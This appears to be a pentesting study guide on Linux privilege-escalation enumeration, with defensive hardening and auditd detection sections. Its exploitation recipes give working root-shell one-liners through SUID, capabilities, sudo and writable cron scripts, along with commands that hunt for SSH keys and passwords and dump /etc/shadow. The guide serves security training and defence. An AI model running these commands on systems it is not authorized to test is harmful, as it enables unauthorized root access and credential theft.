## 1. Overview

Linux enumeration is the systematic process of mapping the local attack
surface: users, permissions, SUID/SGID binaries, capabilities, cron
jobs, systemd units, network services, installed packages, and
credentials in files. Automated tools (linPEAS, LinEnum) speed this up,
but manual enumeration remains essential for understanding what is
actually exploitable.

**What enumeration answers:**

- What privileges and group memberships does the current user have?
- Which SUID/SGID binaries exist, and are any of them exploitable?
- Which binaries have capabilities (cap_setuid, cap_dac_read_search)?
- Which cron jobs run as root, and are their scripts writable?
- Which systemd units run as root, and are they misconfigured?
- Which services listen on the network, and what versions?
- Which credentials are stored in files, history, or environment?
- What is the kernel version, and are there known privesc CVEs?

**The three modes:**

- **Unauthenticated** - no shell (rare on Linux, unless the target is
  exposed and the attack is remote).
- **Authenticated (low-priv)** - a shell as a non-root user.
- **Authenticated (root)** - a shell as root (post-exploitation
  enumeration).

## 2. Reconnaissance / Enumeration

**Offensive - first commands:**

    # Who am I and what can I do?
    id
    whoami
    groups
    sudo -l

    # OS, kernel, architecture
    uname -a
    cat /etc/os-release
    cat /proc/version

    # Users with shells
    grep -E "sh$" /etc/passwd

    # Environment
    env
    set

**Offensive - permissions:**

    # SUID binaries
    find / -perm -4000 -type f 2>/dev/null

    # SGID binaries
    find / -perm -2000 -type f 2>/dev/null

    # Capabilities
    getcap -r / 2>/dev/null

    # Writable files by current user
    find / -writable -type f 2>/dev/null | grep -v /proc | grep -v /sys

    # Writable directories
    find / -writable -type d 2>/dev/null | grep -v /proc | grep -v /sys

    # World-writable files
    find / -perm -0002 -type f 2>/dev/null | grep -v /proc | grep -v /sys

    # World-writable directories without sticky bit
    find / -perm -0002 -type d ! -perm -1000 2>/dev/null | grep -v /proc | grep -v /sys

**Offensive - cron:**

    # System cron
    cat /etc/crontab
    ls -la /etc/cron.d/
    ls -la /etc/cron.hourly/
    ls -la /etc/cron.daily/
    ls -la /etc/cron.weekly/
    ls -la /etc/cron.monthly/
    cat /etc/cron.d/* 2>/dev/null

    # User cron
    crontab -l
    ls -la /var/spool/cron/crontabs/ 2>/dev/null
    cat /var/spool/cron/crontabs/* 2>/dev/null

    # Systemd timers
    systemctl list-timers --all

    # Monitor cron execution in real time (pspy)
    ./pspy64

**Offensive - systemd:**

    # All services
    systemctl list-units --type=service

    # Enabled services
    systemctl list-unit-files --type=service --state=enabled

    # Service files
    ls -la /etc/systemd/system/
    ls -la /lib/systemd/system/
    ls -la /usr/lib/systemd/system/

    # Read a specific unit
    systemctl cat <service>

    # Look for:
    # - Writable ExecStart
    # - Writable EnvironmentFile
    # - Writable WorkingDirectory
    # - Relative ExecStart paths (PATH hijack)

**Offensive - processes:**

    # All processes with full command lines
    ps auxww
    ps -ef

    # Process tree
    pstree -p

    # Processes running as root
    ps aux | grep "^root"

    # Monitor process creation in real time (pspy)
    ./pspy64

**Offensive - network:**

    # Listening ports
    ss -tulnp
    netstat -tulnp

    # Active connections
    ss -tunap

    # Routes and interfaces
    ip a
    ip route
    arp -a
    cat /etc/resolv.conf
    cat /etc/hosts

**Offensive - installed software:**

    # Package managers
    dpkg -l 2>/dev/null
    rpm -qa 2>/dev/null
    apk info 2>/dev/null

    # Versions of common vulnerable packages
    dpkg -l | grep -iE "sudo|polkit|pkexec|glibc|openssh|nginx|apache|mysql|postgres"

    # Sudo version (check against CVE-2021-3156)
    sudo --version

    # Polkit version (check against CVE-2021-4034)
    pkexec --version

**Offensive - credentials in files:**

    # SSH keys
    find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null

    # History files
    cat ~/.bash_history
    cat ~/.zsh_history
    cat ~/.python_history
    cat ~/.mysql_history

    # Configuration files
    find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name ".env" 2>/dev/null | head -50

    # Search for "password" in common locations
    grep -r "password" /var/www/ /etc/ /opt/ 2>/dev/null | head -50

    # Environment files
    cat /etc/environment
    cat ~/.bashrc
    cat ~/.profile

**Offensive - automated tools:**

    # linPEAS (comprehensive)
    ./linpeas.sh

    # LinEnum
    ./LinEnum.sh

    # pspy (monitor processes and cron in real time)
    ./pspy64

    # linux-exploit-suggester (kernel CVEs)
    ./linux-exploit-suggester.sh

    # linux-smart-enumeration
    ./lse.sh -l 2

**Defensive - what to baseline:**

- SUID/SGID binaries (compare against distribution default).
- Files with capabilities.
- Cron jobs and systemd timers.
- Running processes with their parents.
- Listening ports.
- Local user accounts and group memberships.
- Sudoers rules.
- SSH authorized_keys files.
- Package versions.

## 3. Common Misconfigurations

**Permission misconfigurations:**

| Misconfiguration | Detection | Impact |
|------------------|-----------|--------|
| SUID binary exploitable | `find / -perm -4000` + GTFOBins | Root via SUID |
| SGID binary exploitable | `find / -perm -2000` + GTFOBins | Group privileges |
| Capabilities on binary | `getcap -r /` | Root via cap_setuid |
| Writable system script | `find / -writable` | Root via cron/service |
| Writable system directory | `find / -writable -type d` | Binary planting |

**Service misconfigurations:**

| Misconfiguration | Detection | Impact |
|------------------|-----------|--------|
| Writable service binary | `ls -la /etc/systemd/system/` + `systemctl cat` | Root via service restart |
| Writable ExecStart | `systemctl cat` | Root via service restart |
| Relative ExecStart path | `systemctl cat` + writable PATH dir | PATH hijack |
| Writable EnvironmentFile | `systemctl cat` | Env var injection |

**Cron misconfigurations:**

| Misconfiguration | Detection | Impact |
|------------------|-----------|--------|
| Writable cron script | `cat /etc/crontab` + `ls -la` | Root via cron |
| Wildcard in cron command | `cat /etc/crontab` | Argument injection |
| Writable cron directory | `ls -la /etc/cron.*/` | New cron job as root |
| PATH hijack in cron | `cat /etc/crontab` | Root via fake binary |

**Sudo misconfigurations:**

| Misconfiguration | Detection | Impact |
|------------------|-----------|--------|
| Specific binary with sudo | `sudo -l` + GTFOBins | Root via that binary |
| `env_keep+=LD_PRELOAD` | `sudo -l` | LD_PRELOAD injection |
| `env_keep+=LD_LIBRARY_PATH` | `sudo -l` | Library injection |
| Wildcard in sudo command | `sudo -l` | Argument injection |
| Sudo version vulnerable | `sudo --version` | CVE-2021-3156 (Baron Samedit) |

**Kernel and package misconfigurations:**

| Misconfiguration | Detection | Impact |
|------------------|-----------|--------|
| Unpatched kernel CVE | `uname -a` + `linux-exploit-suggester` | Root via kernel exploit |
| Vulnerable pkexec | `pkexec --version` | CVE-2021-4034 (PwnKit) |
| Vulnerable sudo | `sudo --version` | CVE-2021-3156 |
| Vulnerable glibc | `ldd --version` | CVE-2021-33574 etc. |

## 4. Exploitation Recipes

**linPEAS - comprehensive enumeration:**

    ./linpeas.sh

    # Expected output (highlights):
    # [+] SUID - Check easy privesc, exploits and write perms
    # -rwsr-xr-x 1 root root /usr/bin/sudo
    # -rwsr-xr-x 1 root root /usr/bin/passwd
    # -rwsr-xr-x 1 root root /usr/bin/find    <-- unusual
    # [+] Capabilities
    # /usr/bin/python3.9 = cap_setuid+ep       <-- exploitable
    # [+] Cron jobs
    # /etc/cron.d/backup: */5 * * * * root /home/user/backup.sh
    # [+] Sudo version
    # Sudo version 1.8.21p2                    <-- vulnerable to CVE-2021-3156

**pspy - monitor processes and cron:**

    ./pspy64

    # Expected output (real-time):
    # 2026/10/14 13:20:01 CMD: UID=0 PID=1234 | /bin/sh -c /home/user/backup.sh
    # 2026/10/14 13:20:01 CMD: UID=0 PID=1235 | tar czf /tmp/backup.tar.gz *
    # (Reveals root scripts and their arguments.)

**LinEnum - targeted checks:**

    ./LinEnum.sh -t

    # Expected output (highlights):
    # [-] SUID files:
    # /usr/bin/find
    # [-] SGID files:
    # /usr/bin/wall
    # [-] Crontab contents:
    # */5 * * * * root /home/user/backup.sh

**linux-exploit-suggester - kernel CVE matching:**

    ./linux-exploit-suggester.sh

    # Expected output:
    # [+] [CVE-2022-0847] DirtyPipe
    #     Kernel: 5.8 < 5.16.11
    #     Detected kernel version: 5.10.0
    #     -> Vulnerable

**Manual SUID check against GTFOBins:**

    # 1. Find SUID binaries
    find / -perm -4000 -type f 2>/dev/null

    # 2. For each binary, check GTFOBins:
    #    https://gtfobins.github.io/#+suid

    # Example: /usr/bin/find is SUID
    find . -exec /bin/sh -p \; -quit

    # Expected output:
    # # id
    # uid=0(root) gid=0(root) groups=0(root)

**Manual capabilities check:**

    # 1. Find binaries with capabilities
    getcap -r / 2>/dev/null

    # Example output:
    # /usr/bin/python3.9 = cap_setuid+ep
    # /usr/bin/perl = cap_setuid+ep

    # 2. Exploit cap_setuid
    python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'

    # Expected output: root shell

**Manual sudo check:**

    # 1. List sudo rules
    sudo -l

    # Example output:
    # User user may run the following commands on host:
    #     (root) NOPASSWD: /usr/bin/find
    #     (root) NOPASSWD: /usr/bin/vim
    #     (root) NOPASSWD: /usr/bin/awk

    # 2. Exploit each against GTFOBins
    sudo find . -exec /bin/sh \; -quit
    sudo vim -c ':!/bin/sh'
    sudo awk 'BEGIN {system("/bin/sh")}'

**Manual cron check:**

    # 1. Read cron
    cat /etc/crontab
    ls -la /etc/cron.d/
    crontab -l

    # Example output:
    # */5 * * * * root /home/user/backup.sh

    # 2. Check the script
    ls -la /home/user/backup.sh
    cat /home/user/backup.sh

    # If writable by current user:
    echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh

    # 3. Wait for cron, then exploit
    /tmp/rootbash -p

**Manual systemd check:**

    # 1. Find writable unit files
    find /etc/systemd/system/ /lib/systemd/system/ -writable 2>/dev/null

    # 2. Read a writable unit
    systemctl cat <service>

    # 3. If ExecStart is writable, replace with payload
    # (or modify the unit file directly if writable)

    # 4. Reload and restart
    systemctl daemon-reload
    systemctl restart <service>

## 5. Post-Exploitation

**After enumeration identifies a vector:**

- Save output of linPEAS/LinEnum to a file for offline review.
- Prioritize vectors by likelihood and noise:
  1. Credentials in files (silent).
  2. Sudo misconfiguration (silent if no password needed).
  3. Cron with writable script (medium noise).
  4. Systemd with writable unit (medium noise).
  5. SUID binary (medium noise).
  6. Capabilities (medium noise).
  7. Kernel exploit (loud, may crash).

**After getting a shell as root:**

- Dump `/etc/shadow` for all user hashes.
- Search for SSH keys in all home directories.
- Search for cloud credentials in metadata service.
- Search for Kubernetes tokens.
- Enumerate containers (if in a container).
- Enumerate mounted filesystems and shares.
- Search for credentials in databases (MySQL, PostgreSQL, MongoDB).

**On a new host:**

- Run linPEAS again (different host, different misconfigurations).
- Baseline services, cron, systemd.
- Search for credentials in files.
- Search for SSH keys and history.

## 6. Risk Context

Linux enumeration is the phase where the attack surface becomes
visible. Most real-world Linux privesc chains involve a
misconfiguration that was always present; nobody found it because
nobody looked.

**Blast radius of enumeration:** none by itself, but it enables every
subsequent phase.

**Why enumeration succeeds:**

- SUID/SGID binaries accumulate over years.
- Capabilities are granted for convenience and never audited.
- Cron scripts in user directories are common.
- systemd units with writable ExecStart are common in custom services.
- sudoers rules are rarely reviewed.
- Credentials in files (configs, history) are common.
- Patch management is incomplete.

**Why it matters defensively:**

- Every enumeration vector is a detection opportunity.
- Baseline + alert on changes catches most persistence.
- Credential hygiene (no plaintext, no reuse) breaks most chains.

## 7. Root Causes

- **Legacy packages.** SUID/SGID binaries from old software.
- **Convenience over security.** Capabilities granted broadly.
- **Weak cron hygiene.** Scripts in user-writable directories.
- **Custom services.** systemd units written without hardening.
- **Over-permissive sudoers.** Specific commands without argument
  restrictions.
- **Credentials in files.** Config, history, environment.
- **Missing patches.** Kernel CVEs.
- **No baseline.** Enumeration findings are invisible without a
  baseline.

## 8. Preventive Controls

**Permission hardening:**

- Audit SUID/SGID binaries; remove unneeded SUID bits.
- Restrict capabilities to minimum required.
- Restrict write access to system directories.

**Service hardening:**

- Use systemd hardening options (`NoNewPrivileges=yes`,
  `ProtectSystem=strict`, `PrivateTmp=yes`, `ProtectHome=yes`).
- Avoid running services as root.
- Restrict unit file permissions.

**Cron hardening:**

- Restrict cron scripts to root-owned directories.
- Avoid wildcards in cron commands.
- Use absolute paths in scripts.

**Sudo hardening:**

- Specific commands, not wildcards.
- `Defaults secure_path`.
- Avoid `env_keep+=LD_PRELOAD`.
- Patch sudo.

**Credential hygiene:**

- No plaintext credentials in config files.
- SSH keys with passphrases, `0600` permissions.
- Rotate keys and passwords.
- Clear `.bash_history` before deployment.

**Patch management:**

- Patch kernel and packages within days.
- Enable automatic security updates.
- Remove unnecessary packages.

**Monitoring:**

- Enable auditd.
- Forward logs to a SIEM.
- Baseline and alert on SUID/SGID changes, capability changes,
  cron/systemd changes, SSH key changes.

## 9. Detection Controls

**SUID/SGID changes:**

- auditd: `-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat
  -F auid>=1000 -F auid!=unset -k perm_mod`
- AIDE / Tripwire for file integrity.
- Alert on new SUID binaries.

**Capabilities changes:**

- `getcap -r /` as baseline.
- Alert on `setcap` usage (auditd rule for `setxattr`).

**Cron changes:**

- auditd: `-w /etc/cron* -p wa -k cron`
- auditd: `-w /var/spool/cron -p wa -k cron`
- Alert on new cron entries.

**systemd changes:**

- auditd: `-w /etc/systemd/system/ -p wa -k systemd`
- Alert on new unit files.
- Alert on `systemctl daemon-reload` from unusual users.

**sudo abuse:**

- auditd: `-w /usr/bin/sudo -p x -k sudo`
- `/var/log/auth.log` (Debian) or `/var/log/secure` (RHEL).
- Alert on unusual sudo commands.

**SSH abuse:**

- `/var/log/auth.log` for SSH logins.
- Alert on login with keys not in the baseline.
- Alert on `authorized_keys` modifications.

**Kernel exploits:**

- Alert on crash dumps (`/var/crash`).
- Monitor for unexpected kernel module loads.

**Automated enumeration tools:**

- Sysmon for Linux: process creation for linPEAS, LinEnum, pspy.
- auditd: execve rules for unusual binaries.

**General:**

- AIDE / Tripwire for file integrity.
- OSSEC / Wazuh for HIDS.
- Falco for container runtime security.
- Sysmon for Linux.

## 10. Verification

**Offensive - did enumeration find a vector?**

- linPEAS/LinEnum output reviewed; at least one privesc vector
  identified.
- SUID binary confirmed exploitable (tested against GTFOBins).
- Capabilities confirmed exploitable.
- Sudo rule confirmed exploitable.
- Cron/systemd misconfiguration confirmed.
- Kernel CVE confirmed (linux-exploit-suggester).

**Defensive - are misconfigurations absent?**

- SUID/SGID baseline matches; no unexpected binaries.
- Capabilities baseline matches; no unexpected binaries.
- Cron scripts are root-owned and not writable.
- systemd units are not writable; ExecStart paths are absolute.
- sudoers rules are specific and argument-restricted.
- No credentials in config files (search + manual review).
- Kernel and packages current within 30 days.

## 11. OSCP Notes

- Linux enumeration is where OSCP Linux machines are won or lost.
- linPEAS is the standard first tool. Run it, save output, review.
- LinEnum for targeted checks (faster, less noise).
- pspy for real-time process/cron monitoring.
- **Capture screenshots** of:
  - `id` and `sudo -l` output.
  - linPEAS output showing the vector.
  - The specific misconfiguration (SUID binary, cron job, sudo rule).
  - The exploitation step.
- The `> [!IMPORTANT]` OSCP reporting note applies to the enumeration
  finding that leads to privesc.

## 12. Production Notes

- linPEAS and LinEnum are extremely loud: HIDS/EDR flags them on
  execution.
- pspy is quieter but also detected by modern HIDS.
- Manual enumeration (id, sudo -l, find, getcap) is quieter but slower.
- In mature environments, combine manual enumeration with targeted
  scripts.
- Credential hunting in files is often the only silent path.
- Assume enumeration will be detected; plan for speed.

## 13. References

**Linux documentation:**

- [Linux man pages](https://man7.org/linux/man-pages/)
- [systemd documentation](https://www.freedesktop.org/software/systemd/man/)
- [auditd documentation](https://man7.org/linux/man-pages/man8/auditd.8.html)

**MITRE ATT&CK:**

- [Discovery - System Information Discovery (T1082)](https://attack.mitre.org/techniques/T1082/)
- [Discovery - File and Directory Discovery (T1083)](https://attack.mitre.org/techniques/T1083/)
- [Discovery - Software Discovery (T1518)](https://attack.mitre.org/techniques/T1518/)
- [Discovery - Account Discovery (T1087)](https://attack.mitre.org/techniques/T1087/)

**Tools:**

- [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [pspy](https://github.com/DominicBreuker/pspy)
- [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [GTFOBins](https://gtfobins.github.io/)

**Research:**

- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [GTFOBins](https://gtfobins.github.io/)